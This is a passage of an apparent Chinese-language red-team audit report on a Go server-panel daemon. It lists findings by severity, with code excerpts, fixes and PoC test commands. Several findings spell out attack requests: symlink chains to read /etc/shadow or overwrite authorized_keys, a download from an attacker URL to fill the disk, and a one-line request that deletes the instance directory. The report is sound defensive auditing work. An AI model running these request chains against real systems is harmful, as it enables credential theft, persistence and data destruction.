**位置**：`main.go:516-541`（纯词法）、`files.go:282`（读）、`files.go:257`（写）、`files.go:327`（删）、
`files.go:716-775`（压缩递归）、`files.go:676-713`（复制）

```go
// main.go:521 —— 只做字面 Clean，从不 EvalSymlinks
	cleaned := filepath.Clean(target)
	...
	full := filepath.Clean(filepath.Join(cwd, target))
	if !pathWithin(cwd, full) { return "", fmt.Errorf("路径越界: %s", target) }
	return full, nil
```

```go
// files.go:282 —— 交给 OS，内核跟随符号链接
	data, err := os.ReadFile(path)
```

```go
// files.go:758 —— 压缩递归同样跟随（把 cwd 之外的整棵树打进 zip）
			if err := addToZip(zw, filepath.Join(path, e.Name()), filepath.Join(rel, e.Name())); err != nil {
```

**说明**：仓库自带测试 `qa_security_test.go:783-808` 已经发现了这一点，但只 `t.Logf("[发现] …未 EvalSymlinks")`
**不做断言**，因此长期未被修复。

**攻击链**：先在实例 `cwd` 内植入一个指向外部的符号链接（受管进程本身就能创建——面板允许任意
`startCommand`；或 `POST /api/instance/import` 导入一个已含软链的既有目录），然后：
1. `PUT /api/files/ {"target":"link/shadow"}` → 读出 `/etc/shadow`；
2. `{"target":"link/authorized_keys","text":"..."}` → 覆盖外部文件（提权持久化）；
3. `DELETE /api/files {"targets":["link/x"]}` → 删除外部文件；
4. `POST /api/files/compress {"targets":["link"]}` → 把外部整棵树打包，再用 `/api/files/download` 票据取走
   —— 一条**稳定、可重复、无需竞态**的任意文件读取通道。

**影响**：把「实例文件权限」提升为「守护进程权限下的任意文件读写删」，完全绕过 `validateCwd` 与 cwd 边界。
与 [严重-3] 叠加后（cwd 可指向数据目录）无需软链即可达成；对**只被授予文件权限**的账户，这是绕过实例边界的主要手段。

**修复**：统一 `safeResolve`：`Abs → 对已存在前缀 EvalSymlinks → pathWithin 复核 → Lstat 拒绝 ModeSymlink`；
Linux 用 `openat2(RESOLVE_BENEATH|RESOLVE_NO_SYMLINKS)`，Windows 用 `FILE_FLAG_OPEN_REPARSE_POINT`；
压缩/复制遇软链一律跳过或拒绝。

---

### [高-11] 核心下载的 8 GiB 上限只校验"声明的 `Content-Length`"，分块响应可无限写入 【代码确认】

**位置**：`core_download.go:182-186`（唯一的上限检查）、`core_download.go:204-228`（写入循环无上限）

```go
// core_download.go:182
	total := resp.ContentLength
	if total > coreDownloadMaxBytes {
		fail(fmt.Errorf("下载内容过大: %s", FormatSize(total)))
		return
	}
```

```go
// core_download.go:207 —— 循环内 written 只用于进度显示，从不与上限比较
	for {
		n, rerr := resp.Body.Read(buf)
		if n > 0 {
			if _, werr := f.Write(buf[:n]); werr != nil { ... }
			_, _ = hasher.Write(buf[:n])
			written += int64(n)
			if total > 0 { task.set(..., fmt.Sprintf("下载中 %s / %s", ...)) }
		}
		if rerr == io.EOF { break }
```

**攻击链**：`POST /api/instance/download-core {"uuid":"<inst>","url":"http://<attacker-or-mirror>/core.jar","fileName":"core.jar"}`。
镜像源只要以 `chunked` 响应（不写 `Content-Length`，`resp.ContentLength == -1`），
`-1 > max` 为假 → 上限被跳过 → 后续循环无任何字节上限 → 持续输出的源即可写满磁盘。
（审计小组实测：64 MiB 全量落盘，日志"核心下载完成（64.0 MB）"。）

**修复**：改用 `io.CopyN(f, resp.Body, coreDownloadMaxBytes+1)`，超过即失败并删除 `.part-*`；
`ContentLength` 仅作进度参考，绝不作为安全判断依据。

---

## 3. 中

### [中-1] CORS 反射任意来源 + `Allow-Credentials: true`（等价 `*` + 凭据）
`cors.go:24-34`。任意网页可跨源读取节点 API 响应（预检 `cors.go:37-45` 直接 204 免认证终结，
且错误响应也带这些头）。当前凭据是自定义头/查询参数，浏览器不会自动附带，因此**不直接构成认证绕过**；
但一旦前端把 token 放入 Cookie/localStorage，即为完整 CSRF + 读取。恶意页面还可从受害者浏览器
发 `POST /api/auth/login` 触发 [高-5] 的锁定 DoS。
**修复**：来源白名单（默认仅面板端口）；`Allow-Credentials` 只对白名单设置；不回显 `Access-Control-Request-Headers`。

### [中-2] `?token=` 对所有端点生效（含 GET 状态变更接口）
`accounts_handlers.go:49-58`。只有 WS 控制台真正需要查询参数，但 30 天等价凭据可出现在任意 URL：
反代访问日志、浏览器历史、`Referer`、错误上报都会留存明文。**修复**：仅白名单端点允许 `?token=`；响应加 `Cache-Control: no-store`。

### [中-3] 保险库挑战池可被占满 → 拒绝一切解锁（无需保险库凭据）
`vault.go:37`（`maxChallenges=1024`）、`vault_handlers.go:326-361`（签发无限速/无配额）。
仅需持「发起解锁挑战」端点权限的账户，每 5 分钟续 1024 个挑战即可让合法客户端恒 429 → 无法解锁 →
全部数据面 403。**修复**：按用户/IP 限制池内配额（如 8）或 LRU 淘汰最旧；纳入 `vaultLimited` 限速。

### [中-4] 持有效 `X-Vault-Token` 者可无口令复验重绑 TOTP 与证书；会话未绑定证书指纹
`vault_handlers.go:280-308`、`367-419`、`vault.go:374-388`（`sessionFor` 不校验 `certFP`）。
拿到任一解锁会话令牌即可 `totp/reset` + `cert` 重新绑定自己的第二/第三因素，受害用户被永久锁在门外，
攻击者掌握 3 因素中的 2 个。**修复**：敏感操作要求口令复验或当前证书私钥对新挑战签名；会话绑定 `certFP`。

### [中-5] `vault.json` 的 TOTP secret / 证书绑定无完整性保护（与设计 §8.6 不符）
`vault.go:93-105`（明文 `totpSecretB64` / `certFingerprint` / `certPublicPEM`），
`vault_handlers.go:509-515`（解锁时比对存储值，而存储值可被本地静默替换且自洽）。
改写 `vault.json` 可读走全部 TOTP secret、替换证书绑定、借 `kekSaltB64`+`masterKeyWrapB64` 做离线爆破。
**修复**：把 TOTP secret 与证书材料纳入 masterKey 的 GCM/AAD，或对整个 vault.json 做 HMAC。

### [中-6] PBKDF2 迭代次数未随密钥包裹持久化 → 改配置/跨架构迁移后密码永久无法解锁
`vault_crypto.go:119-121`、`vault_handlers.go:117/491`、`embedded.go:97-114`（按 GOARCH 切换 600000/100000）、
`vault.go:93-105`（`vaultUser` 无迭代数字段）。运维只会看到 401"认证失败"，误判为密码错误并触发 unlock 限速。
**修复**：在包裹记录 `kdf`+`iterations`，解锁按记录值派生。

### [中-7] 保险库迁移/回收/备份整文件读入内存 → 单文件 OOM
`vault_migrate.go:321`、`vault_store.go:308-315/902`、`vault_handlers.go:1049-1059`。
vaultFiles 实例 cwd 内存在 8 GiB 文件时（真实世界存档或经 `/upload/` 上传），
停止实例/解锁迁移/备份任一动作都会整文件 `os.ReadFile` → OOM（项目显式支持 armv7/MIPS 低内存设备）。
**修复**：全部改按 `blockSize` 分块流式读写，并设单文件上限。

### [中-8] Redis 会话撤销链路多处缺口 → 登出/改密/删号后旧 token 仍有效
`accounts.go:614-628`（`Del` 失败即 `return`，跳过 `invalidateSession` → 进程内缓存 10s 内仍可用）、
`accounts.go:845-860`（`redisSetSession` 回填会话但**不写** `usess:` 索引 → `revokeUserSessions` 枚举不到）、
`accounts.go:573-610`（Redis 命中路径**不校验账户是否存在**，`IsAdmin` 是登录时快照 → 被删管理员的 token 仍以 admin 通过 `d.auth` 旁路）、
`accounts.go:658-671`（逐个 `Del` 出错即 `break`，剩余 token 与索引保留）、
`accounts.go:809-828`（30 秒降级冷却期内撤销被整段跳过，冷却后 Redis 残留键"复活"）。
**修复**：(1) Redis 不可用时写"撤销水位/黑名单"，恢复后重放；(2) 会话键与索引同 pipeline 写；
(3) Redis 命中路径补账户存在性 + `is_admin` 校验（或不要把 `IsAdmin` 放进 Redis）；
(4) 出错不 break；(5) `delSession` 的 `invalidateSession` 用 defer 保证执行。

### [中-9] 集群/容器下载票据作用域为整个同步区
`cluster.go:275-277`（`CreateDownload("cluster", d.clusterRoot(), "")`，`file` 为空 = 目录范围）、
`container_docker.go:411-421`（dockerExport 同样）、`download.go:245-250`（`t.file == ""` 时跳过单文件校验）。
持「导出容器」或「集群下载」单一开关即可经 `/download/{password}/<任意相对路径>` 读取**整个同步区**
（所有实例镜像/文件）。`NormalizePath` 为纯词法，符号链接可进一步逃出同步区。
**修复**：一律绑定单文件；目录范围票据仅限内部流程并携带一次性 job 标识。

### [中-10] 集群对等节点表与事件表无上限/TTL → 内存注入与线性退化
`cluster.go:375-403`（每次心跳带新 `id` 就 append，永不回收、无 TTL、无上限）、
`cluster.go:407-421`（`maxClusterEvents=100` 只限条数，单条最大 16 MiB → 最坏 ~1.6 GB 常驻）。
且 `clusterPeers` 的 `address` 完全由上报方控制并原样回显（可把真实 peer 地址改写到任意目标）。
**修复**：`map[id]*peer` + 容量上限 + `lastSeen` TTL；事件只留白名单字段并限单条大小；`address` 落库前做保留地址段校验。

### [中-11] 长任务表只增不删 → 64 次后容器长任务接口永久失效
`container.go:184-201`（`maxJobs=64`，全仓无 delete 调用点）。镜像构建/Bastille bootstrap/模板应用
各占 1 槽，64 次后恒返回"任务已满"，重启前无法恢复。**修复**：TTL/状态淘汰已结束任务。

### [中-12] 容器归档解压无总量上限（zip 炸弹）
`container.go:1731-1786`（`unzipTo` 无 `UncompressedSize64` 累计、无条目数上限），
上传端点 `container.go:1547` 对普通账户开放、restore 为管理员端点 → 管理员执行时磁盘被打满。
（对比：`files.go:780-849` 的 `unzip` 已有 50000 条目 + 8 GiB 双上限并带写入端硬截断，说明此处是遗漏。）
**修复**：与 `files.go` 的 `unzip` 对齐。

### [中-13] 容器日志 `tail` 无上限 + `cliRun` 全量缓冲 → 内存打满
`container.go:519-524`（`tail=9223372036854775807` 直接透传）、`container.go:232-241`（`CombinedOutput`）。
**修复**：`tail` 硬上限 + 流式 `io.LimitReader`。

### [中-14] 票据系统全局 10000 上限可被单一账户刷满（10 分钟内拒绝服务）
`download.go:53-54/70-95`（全局单一 store，上限满即返回空 → 503；`Get` 不消费，10 分钟内可重放）。
票据密码本身是 `crypto/rand` UUID（122 bit），**不可枚举/爆破**，此项仅为可用性影响。
**修复**：按账户/来源实例分别限额；满时淘汰最旧票据而非拒绝。

### [中-15] 账户库 0644 + `sessions.token` 明文主键
`accounts.go:280-286`（token 明文入库）、`main.go:231`（数据目录 `0o755`）、全仓无对 `accounts.db` 的 chmod。
多用户 Unix 主机上，本机任意用户读库即得全部有效会话（30 天、滑动续期）。
**修复**：数据目录/账户库 `0o700/0o600`；`sessions` 只存 token 的 SHA-256。

### [中-16] 首启引导 check-then-insert 竞态 + 明文口令长期留存 journald
`auth.go:43-71`（两节点并发启动都读到 `has=false`，各自 INSERT 不同用户名管理员 → 计划外管理员）；
`main.go:334-349`（明文口令进 stderr，systemd 安装脚本引导 `journalctl | grep -A4 首次启动`）。
**修复**：`INSERT ... WHERE NOT EXISTS (...)` 原子化；凭据写 0600 文件并提示立即删除/强制首登改密。

### [中-17] `/api/overview` 泄露数据目录绝对路径与主机信息
`overview.go:49/55`（`"cwd": d.DataDir`）。任意认证账户即可获得 `{data}` 位置，
为 [严重-2]/[严重-3] 提供精确输入。保险库锁定态只脱敏实例数量（`overview.go:58-65`），仍返回 `cwd`。
**修复**：非管理员不回 `cwd`；锁定态整体脱敏主机信息。

### [中-18] 错误响应回显内部错误串/绝对路径
`accounts_handlers.go:161/217/264/360`、`vault.go:256-265` → `vault_handlers.go:178` 等。
泄露表名/列名/驱动细节/绝对路径。**修复**：对外固定文案，细节只进 `alog`。

### [中-19] 配置文件与归档目录权限：`ensureConfigFile` 以 0644 落盘
`config.go:106`。示例配置本身无密钥，但运维随后填入 `accounts.dsn`（含口令）/`redisPassword` 后不会自动收紧。
**修复**：生成即 0600 + 启动时对既有配置做权限检查告警。

---

### [中-20] `/api/instance/logs` 把整个日志文件读进内存 → 单请求数百 MB 分配
`instance_logs.go:61-96`（`readLogTail` 逐文件 `os.ReadFile`，`tail` 只限**行数**不限字节）、
`instance_logs.go:100-118`（`since` 路径同样全量读）。默认 `-instance-log-max 64MB` × 6 个轮转文件，
若每个文件行数少于 `tail`，则必须全部读入。审计小组实测：6×32 MiB（每文件 32 行）→
**服务端单请求分配 768 MiB、响应 192 MiB**；嵌入式档位（≤512 MB 内存）单请求即 OOM。
**修复**：尾部 `Seek` + 分块反向扫描实现 tail；`since` 设单请求读入上限与响应体上限。

### [中-21] `/upload/` 直连通道无大小上限 → 磁盘写满
`download.go:292-306`（`os.Create` + `io.Copy` 无 `LimitReader`/配额）、`main.go:481-488`（明确豁免 `/upload/` 的 16 MiB 上限）。
票据 10 分钟内可无限复用。审计小组实测 20 MiB 上传成功且不受 API 上限约束。
**修复**：按实例/账户加磁盘配额与剩余空间预检；单文件大小上限；票据限制使用次数。

### [中-22] 回收站保护可被普通文件 API 绕过
`trash.go:113-116` 对回收站自身做了保护，但 `files.go:304-330` 的 `DELETE /api/files` 没有任何
`.irix-trash` 判断 → 用 `targets:["/.irix-trash/<id>-<name>"]` 即可**永久删除**回收站内容（绕过"可恢复"语义）。
**修复**：回收站路径在全部文件 API 入口统一保护（`pathWithin(cwd+"/.irix-trash", p)` 即拒绝，除回收站自身端点）。

### [中-23] `targets:[""]` 会删除整个实例工作目录
`main.go:517-520`（空串 `NormalizePath` 直接返回 `cwd`）→ `files.go:304-330` `os.RemoveAll(cwd)`。
审计小组实测 `DELETE /api/files {"targets":[""]}` → HTTP 200 且实例目录整体消失。
**修复**：`NormalizePath` 对空 `target` 返回错误（而不是 `cwd`）；删除端点显式拒绝"删除根"。

### [中-24] 回收站元数据 `uuid` 未校验 → 可读任意 `*.json`
`trash.go:40`（`filepath.Join(d.DataDir,"trash",uuid+".json")`）与 [严重-2] 同类问题：
`uuid=..` 系列可越界读取数据目录内任意 `*.json`（如 `instances.json`、`vault/vault.json`）。
**修复**：与 [严重-2] 一并做 uuid 白名单 + 实例存在性校验 + `pathWithin` 兜底。

### [中-25] 文件操作无互斥 + `Stat→Rename` 竞态（TOCTOU）
`files.go:107-167/292-442`（并发读写同一文件互相覆盖，`os.WriteFile` 直接截断）、
`trash.go:241-247`（`Stat` 后再 `Rename`，其间可被替换）。
这同时为 [高-10] 的软链攻击提供"检查后替换"的时间窗。
**修复**：按实例加文件操作互斥；关键路径"打开后再校验"（fstat/O_NOFOLLOW），不用路径二次检查。

---

## 4. 低

| # | 问题 | 位置 |
| --- | --- | --- |
| 1 | WS 升级不校验 `Origin`（CSWSH 前提）；控制台 token 只能走查询参数 | `websocket.go:54-64` |
| 2 | `jail` 文件列表分页整数溢出 → 处理器 panic（负索引） | `container_bastille_files.go:148-167` |
| 3 | TOTP 防重放比对"当前服务器窗口"而非命中窗口，且不持久化 | `vault_handlers.go:477-484`、`vault_crypto.go:91-102` |
| 4 | 对象头 `blockCount/blockSize` 未认证（AEAD 无 AAD）→ 可静默短读；孤儿尾截断在只读句柄上执行（Windows 实测失败） | `vault_store.go:111-145/166` |
| 5 | `vault.json` 的 `seq` 未校验单调 → 回滚旧备份静默生效（设计承诺的弱防护缺失） | `vault.go:209-213/242` |
| 6 | `scrubOnDelete` 配置项无任何实现（空操作） | `vault.go:62`、`main.go:310` |
| 7 | `logCollector.carry` 单行无上限累积 | `container.go:152-172` |
| 8 | 插件图标 base64 响应放大（500×256 KiB ≈ 170 MiB/响应） | `plugins.go:29-33/206-216` |
| 9 | 插件元数据 `name` 未净化 → 越界目录存在性探测 | `plugins.go:331-353` |
| 10 | Bastille 会话数上限 TOCTOU（并发可超 32） | `container_bastille.go:1283-1297/1406` |
| 11 | JDK 安装：下载 URL 允许 `http://127.0.0.1/...`、`ContentLength==-1` 时无上限、忽略上游 `Checksum`、`archName` 未 `Base` | `jdk_install.go:130-155/211/262-306` |
| 12 | 节点归档上传未与 create/restore 一致地要求管理员（普通账户可堆积 ≤16 MiB/次） | `container.go:1547` |
| 13 | 集群事件/对等节点接口无节点签名校验，任何持权限账户可冒充任意 peer `id` | `cluster.go:375-403` |
| 14 | 集群状态泄露节点 UUID 与同步区绝对路径；`publicAddr()` 在 `-bind 0.0.0.0` 时返回真实网卡 IP | `cluster.go:361-369`、`download.go:327-342` |
| 15 | 传输任务表只增不减（内存缓慢泄漏） | `cluster.go:632-639/644-656` |
| 16 | PBKDF2 在 `v.mu` 写锁内执行且 `/api/vault/password` 无限速 → 单请求阻塞全部数据面 | `vault_handlers.go:441-456/658-707` |
| 17 | 登录响应与 `/api/accounts/me` 缺 `Cache-Control: no-store`；全站无 `nosniff`/CSP | `accounts_handlers.go:165` |
| 18 | 密码策略弱：最小 8 位、无复杂度、bcrypt cost 10 | `accounts.go:34/63` |
| 19 | 实例日志句柄 `uuid` 来自持久化记录且 `Load()` 不校验 → 投毒 `instances.json` 后可越界读/删任意 `*.log` | `instance_logs.go:25-36/190-192`、`daemon.go:344-352` |
| 20 | 仓库内 `tmp-load5/logs/audit.log` 被 git 跟踪（当前为空文件）、工作区存在 28 MB `.exe` 与多个 `zz_*` 探针残留 | 仓库卫生 |
| 21 | `files.go:154-167` 分页整数溢出 → 负索引 panic（审计小组实测 `GET /api/files/list?page=9223372036854775807&page_size=100` 触发 `slice bounds out of range [:-100]`，堆栈指向 `files.go:167`，客户端 EOF；vault 分支 `files.go:65-81` 的 `page_size=-1` 同理） | `files.go:154-167` |
| 22 | Windows ADS / 尾点尾空格：`base.txt:hidden` 生成隐藏备用数据流、`target:"x."` 落盘为 `x` 可绕开 `isExcludedFromSnapshot` 后缀排除 | `files.go:811-818`、`backup.go:44-56` |
| 23 | 上传可写任意扩展名/保留名（`.bat`/`.ps1`/`con`/`.ssh/authorized_keys` 就位；basename 净化本身正确） | `download.go:287-296` |
| 24 | 任务/票据无归属绑定：`jobId` 查询不校验创建者，票据可转发（10 分钟） | `jobs.go:164-178`、`download.go:97-106` |

---

## 5. 待确认（需目标环境验证）

1. **Redis 未授权即等于管理员伪造**：会话 JSON 直接存 `IsAdmin` 且无签名（`accounts.go:75-79/830-843`），
   任何能写 `irix:acct:session:*` 的主体可凭空造管理员会话；`redisPassword` 默认为空
   （`config.example.json`）。需确认现场 Redis 暴露面与是否设密码。
2. **Linux/BSD 上只读 fd 的 `Truncate` 行为**（`vault_store.go:139-143`）：Windows 已实测 `Access is denied`，
   POSIX `ftruncate` 要求可写 fd，需在目标平台实测确认 D11 的"孤儿尾截断"是否全平台失效。
3. **Bastille/容器类的实际放大倍数**：`/api/container/{id}/logs?tail=…`、`bastilleLogs` 的内存放大
   取决于 docker/bastille 对超大 `tail` 的处理，未在真实 Linux/FreeBSD 压测。
4. **`bastilleApply` 模板 args 作为子进程环境**（`container_bastille.go:1094-1100` 用 `append(nil, ...)`
   完全替换环境）：若 bastille 脚本以裸命令名调用外部程序，则 `args:{"PATH":"<可写目录>"}` 可能劫持为宿主 root 执行，
   需对照 bastille 脚本源码。
5. **`/api/audit/log?tail=20000` 的内存峰值**：`instance_logs.go:61` 的 `readLogTail` 会读取
   `audit.log` 与 `.1`（单文件上限 64 MiB），最坏单次读取量级为百 MB，未实测并发放大倍数。
6. **`frpStart` 的 `quotePath` 参数错位**（`frp.go:213` + `main.go:664-688` 的 `SplitCommand`）：
   `-data` 目录路径含引号/空格时是否可造成参数错位或注入额外 argv，未构造成功用例。
7. **`v.migration` 的无锁读**（`vault_migrate.go:222/229/274` vs `markInstancesDone` 持锁写）
   与并发双 unlock 的 `masterKey` 交叉清零，需 `-race` 复现用例确认是否可达。

---

## 6. 修复优先级建议

**P0（立即，可远程未授权/低权限接管）**
1. 修 `purgeLoginFails` 缺锁（[严重-1]）——一行改动，收益最大。
2. `backupsDirOf` 的 `uuid` 白名单 + 实例存在性校验；全部备份端点改用实例记录里的 uuid（[严重-2]）。
3. `validateCwd` 拒绝位于 `{data}` 内的 cwd；`Load()` 重新校验 `cwd`、`instanceUuid` 格式（[严重-3]）。
4. FRP 上传后禁止执行 + 端点收归管理员（[严重-4]）。
5. `RemoveAll` 前强制 `validateCwd` 并拒绝非沙箱目录（[严重-5]）。

**P1（一周内）**
6. 审计脱敏：`redactQuery` 基于 `url.ParseQuery` + 正则兜底，掩码表补 `token`/`secret`/`key`（[高-1]）。
7. 统一 `PathValue` 净化 `safeSeg()` + `pathWithin` 兜底（[高-2]）。
8. 实例属主模型；`console_ws` 文本帧按 `command` 权限键二次判定（[高-3]）。
9. 登录限速 fail-open 修掉；锁定改「账户+IP」；补 dummy bcrypt（[高-5]）。
10. 目录列表默认不算 sha256（[高-6]）。
11. 保险库锁定态拒绝明文写 instances.json（[高-7]）。
12. `jobs.go` order/tasks 一致性 + 后台 goroutine `recover()`（[高-8]）。
13. 免认证入口加读超时/限额（[高-9]）。
14. `safeResolve`（EvalSymlinks + Lstat 拒软链），文件读写删/压缩/复制全部改走它（[高-10]）。
15. 核心下载改 `io.CopyN` 硬上限（[高-11]）。
16. CORS 白名单；`?token=` 收敛到 WS/下载类端点（[中-1][中-2]）。

**P2（一个月内）**：§3 全部中危；Redis 撤销链路重构；容器 volume/env 白名单与管理员门槛。

**P3**：§4 低危与 §5 待确认项的实机验证。

---

## 7. PoC 清单（可复现指令）

PoC 文件：`zz_redteam_poc_test.go`（仓库根，未修改任何生产源码）。

```powershell
# 默认全绿（破坏性/崩溃性用例默认 skip）
go test -run TestRedTeam . -v

# 严重-1：进程级 fatal error（会打印 goroutine 栈并非零退出，属预期）
$env:IRIX_REDTEAM_RACE=1; go test -run TestRedTeamLoginFailMapRace -v .
Remove-Item Env:IRIX_REDTEAM_RACE

# 严重-2：整盘任意文件读取（只读无害文件）+ 完整提权链（低权限账户 → 管理员）
go test -run "TestRedTeamBackupUUIDReachesVolumeRoot|TestRedTeamBackupUUIDTraversalToAdmin" -v .

# 严重-3 / 严重-5 / 高-5 / 高-1 / 高-2
go test -run "TestRedTeamDataDirAsInstanceCwd|TestRedTeamInstanceDeleteWipesArbitraryTree|TestRedTeamLoginRateLimitFailOpen|TestRedTeamAuditRedactionBypass|TestRedTeamMuxPathValueEscaping" -v .
```

**建议**：该文件包含一次会**故意打挂测试进程**的用例（已用 `IRIX_REDTEAM_RACE` 门控）与
一处把 `cwd` 指向 `t.TempDir()` 的破坏性用例（不会碰真实数据）。分诊完成后请删除该文件。

---

## 8. 已核查但不成立 / 误报排除（避免重复投入）

| 怀疑点 | 结论 | 依据 |
| --- | --- | --- |
| 控制台 WS 发 close 帧导致 `close(done)` 双闭 panic（进程级 DoS） | **不成立** | `console_ws.go:163-166` 的 `close(done)` 后 `return`，不会执行第 170 行的第二次 close；实测发 close 帧并保持 TCP 连接无 panic |
| zip 软链条目可植入符号链接逃出 cwd | **不成立** | `files.go:810-838` 对软链条目走 `os.Create` 写普通文件；实测 `Lstat mode=-rw-rw-rw- isSymlink=false` |
| zip 条目名以绝对路径穿越解压目录 | **不成立** | 实测返回 500（`mkdir ...\out\C:` 失败），未产生目录外文件 |
| `/api/vault/../instance` 绕过保险库门禁前缀豁免 | **不成立** | 实测 ServeMux 对未归一化路径先 307/404，重定向后仍过门禁（`vault.go:506-511`） |
| `/api/cluster/transfer` 认证后 SSRF（内网/云元数据） | **不成立** | 协议白名单 + 环回/链路本地/RFC1918/本机 IP 校验 + 每次拨号前重解析（防 rebinding）+ 重定向逐跳校验 + 远端返回的下载地址同样校验（`cluster.go:444-594/679-685/764-767`） |
| 审计 `?a=1;token=x` 可作认证绕过 | **不成立**（但仍是落盘缺陷） | `net/url` 丢弃含 `;` 段，认证不通过 |
| 存在漏挂 `d.auth` / `perm()` 的高危端点 | **不成立** | 163 条路由全量核对：仅 `POST /api/auth/login`、`GET /download/`、`POST /upload/` 免认证（设计如此）；其余全部 auth + perm，`permAllowed` 默认拒绝（`perm_catalog.go:73-79`） |
| 普通账户可自行提权（改 `is_admin` / 权限位 / 改他人密码） | **不成立** | 4 条账户管理端点均 `requireAdmin`；自己改密强制校验 `oldPassword`；无 mass assignment 路径 |
| 容器子系统存在 shell 注入 | **不成立** | 除有意为之的 `docker exec sh -c` / `bastille cmd|run sh -c` 外，外部命令一律 `exec.Command` + 独立 argv |
| JDK/核心下载可被 SSRF 到内网 | **部分** | `core_download.go` 防护完整（拨号期 IP 校验 + 8 GiB 上限 + 可选 sha512）；`jdk_install.go` 仍留 `http://127.0.0.1` 例外（[低-11]） |
| `plugins.go` 读取 jar 可解压炸弹 | **不成立** | 有 `UncompressedSize64` 检查 + `LimitReader`，不解压落盘 |

---

## 9. 蓝队加固建议（非漏洞）

1. **权限模型升级**：为端点引入「风险等级」元数据，把容器/Bastille/FRP 二进制/镜像构建/挂载/运行会话等
   标注为"等价宿主机 root"并默认仅管理员可见；管理类端点永不开放给普通账户。
   当前 163 条路由中只有 7 条在 handler 内额外 `requireAdmin`。
2. **会话生命周期**：30 天 + 滑动续期等于长期凭据（`SECURITY.md:68` 已承认）——建议加绝对上限 + 空闲超时 +
   「查看/踢出全部会话」；`sessions` 只存 token 摘要。
3. **路径与标识符统一治理**：抽 `safeSeg`/`safeID`，凡入参参与路径拼接、命令参数、SQL 的地方强制过白名单；
   对 `Load()` 读入的持久化字段同样校验（持久化文件是信任边界）。
4. **数据目录武装化**：`{data}` 独立账户/`0o700`、启动自检（权限/属主/是否被实例 cwd 覆盖）、
   对 `accounts.db`、`vault/`、`tls/`、`instances.json` 建立完整性监控。
5. **进程隔离**：当前受管实例与守护进程**同用户、同文件系统视图**（`process.go:333-335` 无 Credential/uid 切换，
   `process_other.go`/`process_windows.go` 只做隐藏窗口/Job Object）——任何实例属主天然拥有节点用户的全部能力。
   建议按实例切换 uid + cgroup/namespace 隔离，或至少在文档中明确"实例权限 = 节点权限"。
6. **可观测性**：审计日志同时记录 `r.URL.EscapedPath()` 与 `PathValue`；对 `%2F`/`..`/超长 `tail`/票据刷取
   增加检测规则；后台 goroutine 统一 `recover()` 并计数。
7. **测试补强**：`go test -race` 覆盖登录/会话/权限后端路径；为 `jobs.go`、`files.go:listDir`、
   `backup.go` 的 uuid 校验补回归用例（现有 `qa_*` 测试均未覆盖本次的严重项）。
